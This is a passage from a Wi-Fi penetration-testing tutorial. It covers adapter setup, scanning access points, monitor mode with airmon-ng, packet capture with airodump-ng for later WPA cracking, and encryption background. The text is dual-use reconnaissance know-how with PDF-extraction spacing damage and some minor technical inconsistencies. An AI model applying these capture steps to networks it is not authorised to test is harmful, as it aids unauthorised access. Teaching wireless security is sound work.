+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0  
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0  
+          collisions:0 txqueuelen:1000  
+          RX bytes:0 (0.0 B)   TX bytes:0 (0.0 B)  
+  
+lo        Link encap:Local Loopback    
+          inet addr:127.0.0.1   Mask:255.0.0.0  
+          inet6 addr: ::1/128 Scope:Host  
+          UP LOOPBACK RUNNING   MTU:65536   Metric:1  
+          RX packets:0 errors:0 dropped :0 overruns:0 frame:0  
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0  
+          collisions:0 txqueuelen:0  
+          RX bytes:0 (0.0 B)   TX bytes:0 (0.0 B)  
+When you run  ifconfig,  it shows interfaces  which  are up/active . Wlan0 is not active  at the 
+moment . Put it up with command :  
+ 
+ifconfig wlan0 up  
+ifconfig wlan0  
+wlan0     Link encap:Ethernet   HWaddr 00:c0:ca:3b:34:b6    
+          UP BROADCAST MULTICAST   MTU:1500   Metric:1  
+          RX packets:269 errors:0 dropped:0 overruns:0 frame:0  
+          TX packets:29 errors:0 dropped:0 overruns:0 carrier:0  
+          collisions:0 txqueuelen:1000  
+          RX bytes:17324 (16.9 KiB)   TX bytes:3792 (3.7 KiB)  
+ 
+The MAC address 00:c0:ca:3b:34:b6  should match the MAC address printed under your Alfa 
+card. This i s a quick check to ensure you have enabled the correct interface. In  case you are 
+using alfa card on Kali Linux installed directly on PC.  
+  
+
+ 
+20 Configuring Alfa card  
+We will now check whether your Alfa card is working properly, scanning and detecting 
+access po ints to ensure that in future we do not face any issues related to scanning.  
+ 
+Follow these steps  to connect your w ireless adapter to access point.  
+ 
+Scan the air with core utility  
+Iwlist is a tool that comes pre -installed on almost every Linux system in the  package core -
+utils . This is the same package that gives you all the useful commands like ls, ps, mv, iw. 
+What if you are stuck with a stock device with no internet access? How’d you pentest?  
+With core utilities!  
+Step 0: 
+Kill the network -manager to avoid NIC management issues  
+service network-manager stop  
+Step  1: 
+Scan the air for available access points . 
+iwlist wlan0 scan   
+Output : 
+wlan0     Scan completed :  
+          Cell 01 - Address: FC:DD:55:08:4F:C2  
+                    Channel:6  
+                    Frequency:2.437 GHz (Channel 6)  
+                    Quality=70/70   Signal level= -31 dBm   
+                    Encryption key:on  
+                    ESSID:"rootsh3ll"  
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 18 Mb/s  
+                              24 Mb/s; 36 Mb/s; 54 Mb/s  
+                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 48 Mb/s  
+                    Mode:Master  
+                    Extra:tsf=00000003dee43bf3  
+                    Extra: Last beacon: 36ms ago  
+                    IE: Unknow n: 0009726F6F747368336C6C  
+                    IE: Unknown: 010882848B962430486C  
+                    IE: Unknown: 030106  
+                    IE: Unknown: 2A0100  
+                    IE: Unknown: 2F0100  
+                    IE: IEEE 802.11i/WPA2 Version 1  
+                        Group Cipher : TKIP  
+                        Pairwise Ciphers (2) : CCMP TKIP  
+                        Authentication Suites (1) : PSK  
+                    IE: Unknown: 32040C121860  
+                    IE: Unknown: 2D1A001119FF000000000000 00000000000000000000000000000000  
+                    IE: Unknown: 3D1606080400000000000000000000000000000000000000  
+                    IE: Unknown: DD09001018020200040000  
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00  
+          Cell 02 - Address: D8:FE:E3:7B:40:A0  
+                    Channel:9  
+                    Frequency:2.452 GHz (Channel 9)  
+                    Quality=47/70   Signal level= -63 dBm   
+                    Encryption key:on  
+
+ 
+21                     ESSID:"rav i@wifi" 
+                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s  
+                              9 Mb/s; 12 Mb/s; 18 Mb/s  
+                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s  
+                    Mode:Master  
+                    Extra:tsf=0000000436eb8c36  
+                    Extra: Last beacon: 36ms ago  
+                    IE: Unknown: 0009726176694077696669  
+                    IE: Unknown: 010882848B960C121824  
+                    IE: Unknown: 030109  
+                    IE: Unknown: 2 A0100 
+                    IE: Unknown: 32043048606C  
+                    IE: Unknown: 2D1A2C181EFF00000000000000000000000000000000000000000000  
+                    IE: Unknown: 3D1609000000000000000000000000000000000000000000  
+                    IE: WPA Vers ion 1 
+                        Group Cipher : TKIP  
+                        Pairwise Ciphers (2) : TKIP CCMP  
+                        Authentication Suites (1) : PSK  
+                    IE: IEEE 802.11i/WPA2 Version 1  
+                        Group Cipher : TK IP 
+                        Pairwise Ciphers (2) : TKIP CCMP  
+                        Authentication Suites (1) : PSK  
+                    IE: Unknown: DD180050F2020101800003A4000027A4000042435E0062322F00  
+                    IE: Unknown: 
+DD1E00904C332C181EFF0 0000000000000000000000000000000000000000000  
+                    IE: Unknown: DD1A00904C3409000000000000000000000000000000000000000000  
+                    IE: Unknown: DD0600E04C020160  
+                    IE: Unknown: 
+DD930050F204104A0001101044000102103B000 1031047001063041253101920061228D8FEE37B40A0102100124
+42D4C696E6B20436F72706F726174696F6E1023000D442D4C696E6B20526F75746572102400084449522D363030
+4C1042000D32303037303431332D303030311054000800060050F2040001101100084449522D3630304C1008000
+226881049000600372A000 120 
+ 
+The output is very much cluttered. so, we need to filter the output using iwlist  utility.  
+ 
+iwlist wlan0 scan | grep ESSID  
+Output : 
+ ESSID:"rootsh3ll"  
+ ESSID:"ravi@wifi"  
+ 
+Command Breakdown:  
+iwlist wlan0 scan :  Scan  wireless interface wlan0 , using iwlist  utility  
+| grep ESSID :   Pipe the output to grep using |. Filter lines that contains ESSID  string  
+ 
+ESSID : Extended basic  Service  Set IDentifier, also called as  Access point name . 
+Alfa card successfully  scanned for all available Access points in the vicinit y 
+1. rootsh3ll :  
+2. ravi@wifi  
+ 
+  
+
+ 
+22 Connect ing to Wi-Fi hotspot via  Terminal  
+ 
+Connect to rootsh3ll  (Your personal Wi -Fi hotspot)  
+• Create configuration file  
+• wpa_passphrase [ssid] [passphrase] > wpa.conf  
+ 
+Kill network -manager : 
+Service network -manager stop  
+Install wpa_ supplicant , if necessary : 
+ 
+sudo apt -get install wpasupplicant  
+ 
+wpa_passphrase rootsh3ll iamrootsh3ll > wpa.conf  
+ 
+Display wpa.conf contents  
+ 
+cat wpa.conf  
+network={ 
+    ssid="rootsh3ll"  
+    #psk="iamrootsh3ll"  
+    psk=1f4b02fe4c82f4e0262e6097e7bad1f19283b66 87f084f73331db86c62498b40  
+} 
+ 
+Now connect  WIFI with the base station(hotspot)  
+ 
+wpa_supplicant -D nl80211 -i wlan0 -c wpa.conf  
+Output : 
+Successfully initialized wpa_supplicant  
+wlan0: SME: Trying to authenticate with ec:1a:59:43:3f:fd (SSID='rootsh3ll' freq=24 37 MHz) 
+wlan0: Trying to associate with ec:1a:59:43:3f:fd (SSID='rootsh3ll' freq=24 37 MHz) 
+wlan0: Associated with ec:1a:59:43:3f:fd  
+wlan0: WPA: Key negotiation completed with ec:1a:59:43:3f:fd [PTK=CCMP GTK=CCMP]  
+wlan0: CTRL -EVENT-CONNECTED - Connection to  ec:1a:59:43:3f:fd completed [id=0 id_str=]  
+ 
+Command Breakdown:  
+wpa_supplicant :  Stock utility to associate the wireless cards with access points from   
+ terminal  
+-D nl80211 :   Wireless drivers to carry the authentication/association process.  
+-i wlan0 :   Wireless interface to use. Yours might be different.  
+-c wpa.conf :  Configuration file created with wpa_passphrase  utility.  
+ 
+That’s all the setting you need to preserve to save time. Let’s get into the mechanics of fake 
+AP now  
+ 
+wpa_supplicant can only conne ct to WPA/2 type networks. To connect WEP you can use 
+iwconfig.  
+
+ 
+23 Syntax : iwconfig  <interface>  essid  <ESSID>  channel  <#>   
+ 
+Example:  
+iwconfig wlan0 essid rootsh3ll channel 11   
+ 
+To verify that you are connected, use  
+ 
+ifconfig wlan0  
+ 
+Output should look like th is: 
+wlan0      IEEE 802.11bgn  ESSID:" rootsh3ll "   
+           Mode:Managed Frequency:2.462 GHz Access Point: ec:1a:59:43:3f:fd  
+           Bit Rate=18 Mb/s   Tx -Power=20 dBm    
+           Retry  long limit:7   RTS thr:off   Fragment thr:off  
+           Encryption key:off  
+           Power Management:off  
+           Link Quality=70/70  Signal level= -32 dBm   
+           Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0  
+           Tx excessive retries:0  Invalid misc:7   Missed beacon:0  
+ 
+ 
+ 
+  
+
+ 
+24 Pro Tip  
+Scan th e APs for targeted ESSID, BSSID, Channel no., Signal strength etc.  
+Filter iwlist  output by ESSID and channel number for instance  
+iwlist wlan0 scan | grep -i “essid \| channel:”  
+ 
+Command Breakdown:  
+iwlist wlan0 scan :  Scan  wireless interface wlan0  
+| grep -I   Pipe the output to grep using ‘|’ while ignoring the  character  case ( -i) 
+ 
+“essid \| channel: ” Filter for keywords essid  and Channel :  
+   Note the colon along channel  and no space after the keyword itself . 
+   It prevents output from unne cessary lines. Eve ry filter should  be written in 
+   quotes.  
+   Pipe operator is used as an OR operator. Which means grep will displa y a 
+   line which contain strings essid  OR channel : (case -insensitive).  
+   A backslash \ is used to prevent OR operator to act as pipe. This is called 
+   escape character. It is used to escape characters like spaces,  quotes and 
+   other characters meaningful to the shell syntax.  
+   Observe the output and experiment with distinct keywords , with \| to  
+   optimise  for desired output . 
+--color    (Optional ) to highlight strings in red  
+ 
+Take it to next level…  
+ 
+iwlist wlan0 scan | grep -i --color "essid\| channel: \|quality \|address"  
+Output : 
+          Cell 01 - Address: EC:1A:59:43:3F:FD  
+                    Channel:1  
+                    Quality=63/70  S ignal level= -47 dBm   
+                    ESSID:"rootsh3ll"  
+          Cell 02 - Address: 3C:1E:04:2 2:22:ED 
+                    Channel:1  
+                    Quality=41/70  Signal level= -69 dBm   
+                    ESSID:"anshu" 
+          Cell 03 - Address: DE:1A:C5:B 6:1D:E2 
+                    Channel:1  
+                    Quality=39/70  Signal level= -71 dBm   
+                    ESSID:"sareen"  
+  
+
+ 
+25 Interface doesn't support scanning : Device or 
+resource busy  
+A utility called network -manager that manages all t he connections , their association, 
+disassociation etc all by itself. When you scan the air with iwlist, you asking for controlling a 
+Network Interface Card(NIC) and it clashes with the network -manager.  
+network -manager  utility puts the card in managed mode  and scan APs with better signal 
+strength (in background) itself, resulting in clash for you to prevent hopping between 
+channels and scan the air.  
+So, make sure to kill  it. 
+service  network -manager stop  
+ 
+Summary  
+This chapter provided with detailed instruct ion on How to install Kali Linux in VMWare 
+workstation. Also, in the process, you have learned the basic steps towards:  
+ 
+• Installing Kali Linux in VMWare /HD and exploring other options like disconnecting 
+wireless adapter from host  
+• Configuring Alfa card usin g command line  
+• Scanning the air and detecting the available access points, using Terminal  
+• Scanning the air like a ninja for targeted reconnaissance.  
+ 
+It is important to understand each and every command used in the tutorial, if you didn’t 
+gain confidence i n installing the system and configuring the Alfa card, I would rather 
+recommend you to repeat this chapter a couple of times.  
+ 
+In later chapters,  we will be covering more complicated scenarios.  
+  
+
+ 
+26 1 
+Understanding Basics 
+of Wi -Fi networks  
+ 
+ 
+ 
+ 
+ 
+ 
+Wireless net works(Wi -Fi) and its need  
+Before getting into the  practical details , I would like to tell you that this chapter will be 
+completely theoretical and is solely written for the deeper understanding of the Wi -Fi and 
+its security mechanism.  
+This chapter will ta ke you through the beginning of the Wi-Fi, how  wireless interfaces works, 
+how Wi-Fi is different and better from Bluetooth ( not only in terms of Transfer Speed), You 
+will also learn similarity between all the Wireless devices.  
+ 
+So, I would like you to read  this chapter thoroughly, because this build you a strong 
+foundation  in wireless networking, raise your capabilities  and will be very helpful in your 
+life, especially your Security related career.  
+ 
+Let’s  get started,  
+  
+
+ 
+27 What  is Wi-Fi? 
+Wi-Fi is the name of t he popular wireless networking technology that uses  radio waves  to 
+propagate through air for providing  High -Speed Internet and network connections  reducing 
+uses of wires effectively . see  Webopedia  
+What is the need for Wi -Fi? 
+World has always been moving towards the better. And  according to the statistics it is clear 
+that in next 5 years a large population will be using wireless devices for the purpose like 
+storing data, streaming  music, accessing high -speed Internet etc.  
+ 
+Wireless technology not only saves the element used to manufacture the wires but also 
+provide s way much lesser installation cost of the devices, since there is no wire for per-
+device  installation but just some information to be registered , which is perhaps matter of a 
+few minutes.  
+ 
+As we see today wireless devices have become a n essential part  for one’s life. Over time , it 
+is going to expand to as much people as it can.  
+Henc e, more wireless device, more the vulnerabilities and more the need for Wi-Fi Security 
+Experts.  
+Types of encryption and their need  
+For data security, Wi -Fi access points encrypt the data packets with a cryptographic 
+algorithm to prevent eavesdropping and o ther kind of security breach to some extent. 
+Though each of them have some sort of vulnerability. Before exploitation of those 
+vulnerabilities let us see the encryption types and policies.  
+What are the types of encryption ? 
+WLAN [Wireless Local Area Network ] can be secured using  3 security protocols  
+1. WEP – Wired Equivalent Privacy  
+2. WPA – Wi-Fi Protected Access  
+3. WPA2 – Wi-Fi Protected Access II  
+ 
+All the 3 protocols have their own encryption methods better than the previous.  
+• WEP – Uses RC4 algorithm for encryptin g data packets  
+• WPA – Uses TKIP encryption, based on WEP  
+• WPA2 – Uses AES, most secured and unbroken at this point  
+
+ 
+28 What is the need?  
+In 1997,  Wi-Fi Alliance  released the first security standard for the wireless networks i.e. 
+WEP, but sooner in 2001 WEP was broken twice leading to the password recovery/hacking 
+of the wireless network. Then again in 2002 A security researcher discovered a security flaw 
+in WEP. WEP was broken beyond repair at this p oint.  
+This was the time IEEE committee  said that they need a quick patch for WEP.  
+In 2003 WPA, an intermediate solution for WEP was released.  
+WPA was supposed to run on the same hardware supported by WEP. All what one needed 
+to do is a firmware update.  
+Som e key things to note:  
+• WPA uses TKIP encryption, which wraps up over the WEP packets to clean some 
+vulnerabilities discovered earlier and provide a better security. So, it was basically 
+based on WEP.  
+• Hardware changes were not mandatory for WPA, as it was su pposed to fix the 
+vulnerability of the router that had already been shipped.  
+• At the same time Wi-Fi alliance started working on the much -secured  protocol of Wi -
+Fi which was named WPA2.  
+ 
+A year later, in September 2004 Wi-Fi Alliance released the most secur ed version of the 
+Wireless security i.e. WPA2  
+ 
+How WPA2 is different from WPA?  
+• There are some basic differences between the two:  
+• WPA2 uses AES for packet encryption, it is perhaps most secured encryption method 
+available and unbroken at this point.  
+• Hardwar e changes are mandatory for running WPA2.  
+• Released as the new standard for Wireless devices and from march 2006 WPA2 
+certification is mandatory for all new devices to bear the Wi -Fi trademark.  
+  
+
+ 
+29 Understanding Public and Private  IP 
+As the heading suggests, there are 2 types of IP addresses for a computer connected to a 
+network.  
+ 
+Public IP  
+A computer on the Internet is identified by  a unique 32 -bit address, Public IP . IP addresses 
+are publicly registered with Network Information Centre (NIC) to avoid IP confl icts. 
+Computer on  router protected  Local Area Network (LAN)  need not to be accessed by the 
+public, for this reason NIC has reserved certain addresses that can never be registered 
+publicly. Those addresses are called  
+ 
+Private IP  
+IP address of a computer ins ide a W/LAN. example, 192.168.1.101  
+Certain addresses reserved by the NIC are divided into 3 classes of Private IPs: 
+ 
+Classes, Subnet and Pool Size  
+Network 
+Class  IP Address Range  Subnet mask  Maximum 
+Hosts  Use 
+A 10.0.0.0  - 10.255.255.255  255.0.0.0  16,777,2 16 For large 
+networks spread 
+across cities  
+B 172.16.0.0  - 172.31.255.255  255.255.0.0  1,048,576  For networks 
+like 
+Universities  
+C 192.168.0.0  - 192.168.255.255  255.255.255.0  65,536 Perfect for 
+home routers!  
+ 
+Private IP  addresses are assigned to the client  devices connected to th e router . A client  
+device can  be your Laptop, Mobile, Tablet, anything  which  is capable of w ireless.  
+  
+
+ 
+30 How to Check Public  IP? 
+Just google  “my ip”. It will show your Public ly exposed  IP address.  
+ 
+Uses of Public IP  
+Apart from just l ocating the device over the Internet, Public IP play a significant role in  
+Reverse IP lookup  
+It is often called  Reverse IP domain check . What happens is, you enter a domain 
+name,  say google.com  and the Reverse IP tool will check the IP address of 
+google.com [216.58.192.46] and then will check other sites known to be hosted on 
+the same web address . 
+DNS Lookup  
+Websites like who.is  allows us to check the name server of a website and other 
+interesting stuff with that. This is by far one of the best and most useful website for 
+the hackers!  
+Find IP location or IP geolocation  
+Simple jus t google “find ip location” or go to this website:  iplocation.net . 
+It will show all the details related to your public IP. You can see your  location on google 
+maps also. Keep looking! you’ll find much interest ing stuff.  
+  
+Stuff with Private IPs? We will be performing them along the series. Stay tuned!  
+ 
+Possible attacks on a Wi -Fi Access Point (AP)  
+Even if you are not connected to the network as you don’t have the key, you can still 
+perform attacks on the WLAN o r the connected clients(Devices).  
+A few information that always remains unencrypted are:  
+1. ESSID , or AP name. “rootsh3ll” in our case.  
+
+
+ 
+31 2. BSSID , Client’s MAC address  
+3. Router’s MAC address  
+4. Channel , on which the Access point is operating.  
+5. Encryption type , WEP, WPA /WPA2 or WPS  
+ 
+An attacker can leverage this info  to perform possible attacks to  
+• Jam the network  
+• Disconnect legitimate client  
+• Force  the client to connect to hacker created Access point, or create a honeypot  
+ 
+Future of Wi-Fi 
+As the world is moving from the W ired to wireless(better) devices and also the wireless 
+devices are exponentially becoming faster, better, cheaper the future  of Wi -Fi is very much 
+bright . 
+ 
+As you might have seen Apple’s infamous MacBook . It has just a single port(USB -C) for 
+charging, as W ireless charging is not available at this moment. Any kind of data transfer 
+to/through the MacBook has to be wireless. It can be:  
+• Listening to music  
+• Storing data on SSD 
+• Accessing Internet etc.  
+ 
+Crucial part is, storing  data on SSD wirelessly  might  be slowe r than Storing with wires ( USB 
+3.0). But the good news is MacBook and many new routers are now capable of  802.11ac 
+type networking . Which is 3X faster than the type -n networking . So, storing data wirelessly 
+is going to be amazingly easier not only on MacBook but on every device,  that will support 
+type -ac networking.  
+  
+
+ 
+32 2 
+Cracking the Wireless 
+Network Security  
+ 
+ 
+ 
+ 
+ 
+Introduction to Aircrack -ng Suite of 
+Tool s 
+What is Aircrack -ng? 
+Aircrack -ng is a suite of tools use d by beginners and experts for wireless sniffing, cracking 
+and creating rogue access points . 
+Conventional definition goes like: 
+Aircrack -ng is an 802.11 WEP and WPA /2-PSK keys cracking program that can recover keys 
+once enough data packets have been captured . 
+ 
+Aircrack -ng suite includes  tools like:  
+• Airmon -ng 
+• Airodump -ng 
+• Airbase -ng 
+• Aireplay -ng 
+• Airolib -ng 
+• Aircrack -ng 
+
+ 
+33 We will discuss about the tools above, as they are most frequently used tools and used  in 
+almost every wireless pentest.  
+Aircrack -ng comes for Linux, Mac, and Windows and comes pre -installed in Kali Linux. We 
+can manually install Aircrack -ng on Linux, Mac or Windows.  
+ 
+Download Aircrack -ng 
+Latest version of Aircrack -ng can be downloaded from  its official site,  Aircrack -ng.org  
+For Linux and Mac, it can be installed from  source code , and  
+For Windows, Aircrack -ng provides pre -compiled binaries. You can download the zip  here  
+ 
+Install Aircrack -ng 
+In Windows, Aircrack -ng comes in a download -and-execute pre -compiled binary package.  
+Installin g on Windows:  
+Unzip aircrack -ng*.zip ( aircrack -ng-1.2-rc4-win.zip , as latest version)  
+Steps to use:  
+1. Open extracted aircrack -ng folder  
+2. Press and hold [Shift] key and right -click anywhere  
+3. Select “Open command window here”  
+4. Enter dir for list of files and fold ers 
+5. Enter any command for a help menu  
+ 
+Here is complete  tutorial on installing on windows  
+There are 2 ways of installing Aircrack -ng in Linux:  
+• Using default package installer , with repositories, or  
+• Using source  code 
+We will take an example of  
+ 
+Installing  on Linux  
+O.S. via Package Manager  via Source C ode 
+Ubuntu  sudo apt -get install aircrack -ng cd ~/Desktop / 
+wget http://download.aircrack -ng.org/aircrack -ng-1.2-rc4.tar.gz  
+Red Hat  sudo yum install aircrack -ng tar zxvf aircrack -ng*.tar.gz  
+cd aircrack -ng-*/ 
+Arch Linux  sudo pacman install aircrack -ng make sqlite=true  
+make sqlit e=true install  
+ 
+Parameter  sqlite=true  is to add Airolib -ng support in the Aircrack -ng. We will see the use of 
+Airolib -ng for speeding up WPA2 cracking in upcoming chapters.  
+ 
+Now let’s  start using the aircrack -ng suite of tools  
+
+ 
+34 1. Make sure your wireless c ard is connected. Then open Terminal.  
+2. Type  ifconfig  and check your wireless interface,  wlan 0 in my case and we will be 
+using  wlan 0 in the tutorial  
+ 
+ifconfig wlan 0 
+wlan0     Link encap:Ethernet   HWaddr 00:c0:ca:3b:34:b6   
+          inet addr:192.168.1.10 1  Bcast:192.168.1.255   Mask:255.255.255.0  
+          inet6 addr: fe80::2c0:caff:fe5a:34b6/64 Scope:Link  
+          UP BROADCAST RUNNING MULTICAST   MTU:1500   Metric:1  
+          RX packets:37 errors:0 dropped:0 overruns:0 frame:0  
+          TX packets:33 error s:0 dropped:0 overruns:0 carrier:0  
+          collisions:0 txqueuelen:1000  
+          RX bytes:4437 (4.3 KiB)   TX bytes:3506 (3.4 KiB)  
+ 
+If you type  iwconfig wlan 0 you should get something like this:  
+iwconfig wlan 0 
+ 
+wlan0     IEEE 802.11bgn   ESSID:"rootsh3ll "   
+          Mode:Managed   Frequency:2.462 GHz   Access Point: FF:DD:32:08:6D:C2     
+<-------------------------- SNIP-------------------------- > 
+ 
+You can see  Mode: Managed , now  
+ 
+What is managed  mode?   
+By default,  our wireless card works on  Managed mode  i.e. it will only accept the traffic from 
+the Access point it is associated(connected) to.  All the other irrelevant packets will be 
+dropped for reducing processing load for the router.  
+ 
+And for Wireless sniffing our card has to be in monitor mode so that it can  receive traffic 
+from any Wireless network without associating with it.  
+Here comes the first tool of Aircrack -ng suite of tools.  
+ 
+Airmon -ng 
+airmon -ng is used to put the wireless card from Managed to Monitor mode and Vice -versa. 
+It is also used to prevent w ireless pentest for getting into any trouble with existing utilities, 
+like network -manager, wpa_supplicant, etc.  
+Just check and kill all the processes that could cause issues before Wi -Fi pentest.  
+airmon-ng check kill  
+It fixes almost all the issues you ’d face during pentest otherwise.  
+Let’s  see how to put wireless card into monitor mode.  
+Put card into Monitor mode:  
+airmon-ng start wlan 0  
+It will create an interface with name  wlan0mon , check using  ifconfig . 
+
+ 
+35 Put card into Managed mode:  
+airmon-ng stop wlan0mo n 
+Here wlan0mon  can be replaced by wlan0mon , wlan1mon , etc. If multiple monitor 
+interfaces are running.  
+Now we need to start sniffing the air. It can be done using  
+Airodump -ng 
+Airodump -ng allows us to  
+• Sniff the air using  monitor mode (wlan 0mon ) interface  
+• Dumping the captured packets into a “.cap” file, and  
+• Lots of INFORMATION!!!  
+ 
+Let’s  start airodump -ng 
+airodump -ng mon0 
+This is the basic co mmand to run airodump -ng on wlan0mon  interface.  
+ 
+It will show an output  screen like this:  
+ 
+CH  4 ][ Elapsed: 24 s ][ 20 17-06-25 00:45 
+ BSSID   PWR Beacons  #Data, #/s CH   MB   ENC   CIPHER AUTH ESSID  
+ D8:55:A3:B1:8B:FF   -40 11   18  0 6    54e  WPA   CCMP   PSK  harry@   
+ FC:DD:32:08:6D:C2   -67 13   80  0 11   54e  WPA2  CCMP   PSK  rootsh3ll  
+ 80:D0:9B:DE:15:EE   -74 2   0  0 1    54e  WPA2  CCMP   PSK  .com 
+ 
+ BSSID              STATION   PWR Rate  Lost Frames  Probe            
+ D8:55:A3:B1:8B: FF  34:31:11:63:CE:96    -74 5e 5e   0  19 
+ FC:DD:32:08:6D:C2   00:C0:CA:3b:34:B6   0 0e- 1  0 272  rootsh3ll     
+ FC:DD:55:08:6D:C2   30:A8:DB:C6:88:13  -127 0e- 0e  10 81 
+ 
+We will cover the important information from the above output.  
+ 
+Line  Segment  Meaning  
+1 Ch 4 Card’s frequency at the moment . 
+A wireless card is a type of radio; it can work on one channel at a time. You’ ll see the  
+variab le channel no. in airodump -ng output.  It’s called Time Division Multiplexing . 
+2 BSSID  Basic Service Set IDentifier : MAC /Physical  address of AP 
+ PWR  Signal strength of listed network, SI unit is  dBm.  
+Closer to zero, the better . 
+ ENC Encryption  schema. could be Open, WEP, WPA/WPA2  
+ ESSID  Extended Service Set Identifier  or Access Point name  
+7 Station  Client associated with corresponding BSSID  
+ Probe  Client send probe requests packets for an Access Point(rootsh3ll ) it was previously 
+connected to , see Line  13. 
+ 
+
+ 
+36 Hit CTRL -C to stop scanning.  
+Data packets can also be captured and saved into file using  -w option with airodump -ng. 
+ 
+Example:  
+airodump -ng mon0 -w test_data_capture  
+ 
+Hit ^C to quit and  list the captured data files  ls test_data_capture*  
+ 
+ls test_data _capture -01.* 
+test_data_capture -01.cap  test_data_ca pture-01.csv    
+test_data_capture -01.kismet.csv  test_data_capture -01.kismet.netxml  
+ 
+airodump -ng has saved the output in .cap, csv and netxml formats . 
+We will use .cap file for our cracking process.  
+Above steps ha ve to be followed in every Pentest we will do. We will see the use of 
+remaining tools  
+ 
+• Airbase -ng 
+• Aireplay -ng 
+• Airolib -ng 
+• Aircrack -ng 
+  
+in upcoming chapters,  accordingly.  
+Conclusion  
+We learned to install aircrack -ng on Linux and windows systems. Put ting wireless card on 
+monitor mode and scanning the air and saving the information to a file for future use. as it 
+will be used in WEP and WPA/WPA2 cracking.  
+  
+
+ 
+37 Introduction to Wireshark  
+Wireshark is a free and open -source packet analyser . It is one of the most powerful and 
+popular tools used by pentesters as well as network administrators for  
+● Network troubleshooting  
+● Packet Analysis  
+● Software and communications protocol development, and  
+● Education  
+ 
+As for analysis, it is used to inspect packets passing  through  the network interface which 
+could be your Ethernet , LAN, Wi -Fi, USB ( storage or modem). In other words, Wireshark is a 
+packet sniffer for the pentesters.  
+ 
+From the perspective of a pentester, Wireshark is  a 
+● Packet sniffer  
+● Network analyser  
+● Network performa nce monitoring tool  
+● Protocol analyser  
+ 
+The series of data that Wireshark  inspects are called ‘frames’ which includes ‘packets ’. 
+Wireshark has the ability to capture all the packets passing through the network interface 
+and decode them for analysis.  
+Data fr ame may be encrypted or in clear -text, example beacon frame  
+ 
+Octets  2 2 6 6 6 2 6 0 - 2312  4 
+ FC D/I Address  Address  Address  SC Address  Frame body  CRC 
+This table  shows  MAC  Frame  format  
+Reverse Acronym:  
+FC : Frame Control  
+D/I:  Duration/ connection ID  
+SC :  Sequence Control  
+CRC:  Cyclic Redundancy Check  
+ 
+The following excerpt from William Stalling’s Data and Computer Communications  explains 
+these fields:  
+ 
+Frame Control : Indicates the type of frame (control, management, or data) and 
+provides control information. Control information includes whether the frame is to 
+or from a DS, fragmentation information, and privacy information.  
+ 
+Duration/Connection ID : If used  as a duration field, indicates the time (in 
+microseconds) the channel will be allocated for successful transmission of a MAC 
+frame. In some control frames, this field contains an association, or connection, 
+
+ 
+38 identifier.  
+Addresses : The number and meaning of  the 48 -bit address fields depend on context. 
+The transmitter address and receiver address are the MAC addresses of stations 
+joined to the BSS that are transmitting and receivin g frames over the wireless LAN.  
+The service set ID (SSID) identifies the wirele ss LAN over  which a frame is  
+transmitted. For an IBSS, the SSID is a random number generated at the time the 
+network is formed. For a wireless LAN that is part of a  larger configuration the SSID 
+identifies the BSS  over which the frame is trans mitted; speci fically, the SSID is the 
+MAC -level  address of the AP for this BSS . 
+Finally,  the source address and destination address are the MAC addresses of 
+stations, wireless or otherwise, that are the ultimate source and   
+destination of this frame. The source address  may  be identical to the transmit ter 
+address and the destination address may be identical to the receiver  address.  
+ 
+Sequence Control : Contains a 4 -bit fragment number subfield, used for 
+fragmentation and reassembly, and a 12 -bit sequence nu mber used to num ber 
+frames sent between a given transmitter and receiver.  
+ 
+Frame Body : Contains an MSDU or a fragment of an MSDU. The MSDU is a LLC 
+protocol data unit or MAC control information.  
+ 
+Frame Check Sequence : A 32 -bit cyclic redundancy check.  
+ 
+It is important to note that  Wireshark is  used by the  Sysadmins  to check if any sensitive data 
+is being transmitted securely (Encrypted), at the same time it can also be used by a hacker 
+on unsecured(unencrypted) networks.  
+ 
+We will learn how a hacker can misuse legitimate t ools for malicious purposes once s/he is 
+connected to the network.  
+Before moving on to the installation process and tutorial it is necessary to know the history 
+behind the tool.  
+ 
+History  
+Wireshark, originally named as  Ethereal , was written and released by Gerald combs, who 
+was a computer science graduate of the University of Missouri –Kansas City. In late 1990s 
+the commercial protocol analysis tools were prices near $1500 and also were not 
+compatible on the company’s primary platforms ( Solaris and Linux). So , Gerald began 
+writing Ethereal and released the first version in 1998.  
+ 
+Why Ethereal was re named ? 
+In 2006, Combs accepted a job with CACE technologies. Combs didn’t own the trademark of 
+Ethereal ( owned by Network Integration Services), but held copyright on most of the 
+
+ 
+39 Ethereal source code, so he used the contents of the Ethereal Subversion repository as the 
+basis for the Wireshark repository and then named the project as “Wireshark”.  
+ 
+According to Wikipedia , 
+“Wireshark has won several industry awards over  the years, including  eWeek , InfoWorld , 
+and PC Magazine . It is also the top -rated packet sniffer in the Insecure.Org network security 
+tools survey and was the Source Forge  Project of the Month in August 2010. ” 
+ 
+From 2006 onward s, Wireshark  has been in the top 10 tools used by the penetration testers 
+and hackers.  
+  
+Wireshark comes pre -installed on most of the pentesting distros like Kali Linux, Backbox, 
+Pentoo, Samurai WTF. But being a penetration tester, network administrator or a script 
+kiddie, it is very essential for one to know the installation process of any tool and not to rely 
+upon the preinstalled tools and just use them.  
+Pentesting distros are designed for the  pentesters  to work faster , by not having to install 
+and fix  the system every time, and for  education purposes also. But people tend to 
+misunderstand this with  work lesser . It might  seem the same but it i sn’t.  
+You should learn how to install and fix the  software.  It will not only give you an in -depth 
+understanding of working of the tool, bu t also by doing this you open new possibilities  for 
+yourself to do more.  It is like a valuable investment which seems small right now, but 
+rewards you in long -run, beyond your thoughts and understandings.  
+ 
+Installation  and Setup  
+Wireshark is available for Wind ows, Mac and Linux. You can download Wireshark  from 
+the official site . 
+But I am more interested in teaching stuff from scratch. so, let’s compile  Wireshark  on Linux 
+from  source code.  
+Download the latest source code  here . and save it on the desktop.  
+Open terminal and type:  
+ 
+cd ~/Desktop    #Move from current directory to Desktop  
+tar xvf wireshark *.bz2  #Extract bun zip2 type compressed package  
+cd wireshark*    #Move to extracted directory  
+ 
